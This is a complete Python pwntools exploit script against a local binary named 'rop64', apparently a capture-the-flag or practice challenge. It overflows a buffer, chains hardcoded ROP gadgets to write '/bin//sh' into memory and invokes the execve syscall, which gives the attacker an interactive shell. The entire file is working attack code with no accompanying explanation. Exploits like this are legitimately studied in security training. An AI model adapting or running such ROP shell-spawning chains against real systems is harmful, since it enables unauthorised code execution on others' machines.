#!/usr/bin/env python2

from pwn import *

elf = ELF('./rop64')
p = process('./rop64')

pop_rdi = 0x0000000000400686
pop_rsi = 0x00000000004100d3
pop_rdx = 0x00000000004499b5
pop_rax = 0x00000000004156f4
mov_rsi_rax = 0x000000000047f561
data = 0x00000000006b90e0
syscall = 0x000000000047b6ff

payload = 'A'*24 # Offset to return address

# Put the string '/bin//sh' into the data section
payload += p64(pop_rsi)
payload += p64(data)
payload += p64(pop_rax)
payload += '/bin//sh'
payload += p64(mov_rsi_rax)

# Set rdi to the address of the data section
payload += p64(pop_rdi)
payload += p64(data)

# Zero out rsi and rdx
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)

# execve syscall
payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(syscall)

p.recv()
p.sendline(payload)

p.interactive()
